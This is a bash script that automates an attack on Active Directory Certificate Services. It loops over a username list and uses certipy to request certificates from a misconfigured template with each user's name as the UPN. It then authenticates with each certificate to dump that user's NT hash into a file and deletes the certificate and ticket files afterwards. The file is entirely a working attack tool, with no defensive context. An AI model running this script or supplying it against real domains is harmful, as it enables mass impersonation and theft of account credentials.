#!/bin/bash

if [ "$#" -ne 1 ]; then
  echo "Usage: $0 <username list>" >&2
  exit 1
fi

input_file="$1"

hashes_file="hashes.txt"

while read -r line; do
    certipy req -u 'user@domain.local' -p 'Passw0rd' -target 'ADCS.domain.local' -ca 'CA-Vuln' -template 'Vulnerable Template' -upn "$line"
    certipy auth -pfx "$line.pfx" -dc-ip '10.10.10.10' -username "$line" -domain 'domain.local'  | tee /dev/tty | grep "Got hash for" >> "$hashes_file"
    rm *.pfx
    rm *.ccache
done < "$input_file"

printf "[+] Done dumping!"
